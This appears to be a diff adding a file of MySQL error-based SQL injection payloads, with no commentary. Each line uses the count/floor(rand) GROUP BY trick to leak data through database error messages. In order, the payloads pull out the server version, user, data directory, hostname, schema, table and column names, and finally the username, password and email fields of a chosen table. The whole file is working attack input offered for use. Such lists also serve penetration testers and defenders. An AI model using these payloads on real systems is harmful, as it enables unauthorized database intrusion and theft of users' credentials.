@@ -1,0 +1,13 @@
++and(select 1 FROM(select count(*),concat((select (select concat(version())) FROM information_schema.tables LIMIT 0,1),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)
++and(select 1 FROM(select count(*),concat((select (select concat(user())) FROM information_schema.tables LIMIT 0,1),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)
++and(select 1 FROM(select count(*),concat((select (select concat(@@datadir)) FROM information_schema.tables LIMIT 0,1),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)
++and(select 1 FROM(select count(*),concat((select (select concat(@@hostname)) FROM information_schema.tables LIMIT 0,1),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)
++and(select 1 FROM(select count(*),concat((select (select concat(database())) FROM information_schema.tables LIMIT 0,1),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)
++and(select 1 FROM(select count(*),concat((select (select (SELECT distinct concat(0x7e,0x27,count(schema_name),0x27,0x7e) FROM information_schema.schemata LIMIT 0,1)) FROM information_schema.tables LIMIT 0,1),floor(rand(0)*2))x from information_schema.tables GROUP BY x)a)
++and(select 1 FROM(select count(*),concat((select (select (SELECT distinct concat(0x7e,0x27,cast(schema_name as char),0x27,0x7e) FROM information_schema.schemata LIMIT N,1)) FROM information_schema.tables LIMIT 0,1),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)
++and(select 1 FROM(select count(*),concat((select (select (SELECT concat(0x7e,0x27,count(table_name),0x27,0x7e) FROM `information_schema`.tables WHERE table_schema=<HEX_VLAUE_OF_DB_NAME>)) FROM information_schema.tables LIMIT 0,1),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)
++and(select 1 FROM(select count(*),concat((select (select (SELECT concat(0x7e,0x27,count(column_name),0x27,0x7e) FROM `information_schema`.columns WHERE table_schema=<HEX_VLAUE_OF_DB_NAME> AND table_name=<HEX_VLAUE_OF_TABLE_NAME>)) FROM information_schema.tables LIMIT 0,1),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)
++and(select 1 FROM(select count(*),concat((select (select (select distinct concat(cast(column_name as char)) FROM information_schema.columns WHERE table_schema=<HEX_VLAUE_OF_DB_NAME> AND table_name=<HEX_VLAUE_OF_TABLE_NAME> LIMIT 0,1)) FROM information_schema.tables LIMIT 0,1),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)
++and+(select 1 FROM(select+count(*),concat((select+concat(0x3a,username,0x3a,password,0x3a,email,0x3a) FROM <TABLE_NAME>+LIMIT+0,1),floor(rand(0)*2))x FROM information_schema.tables+GROUP BY x)b)
+
+
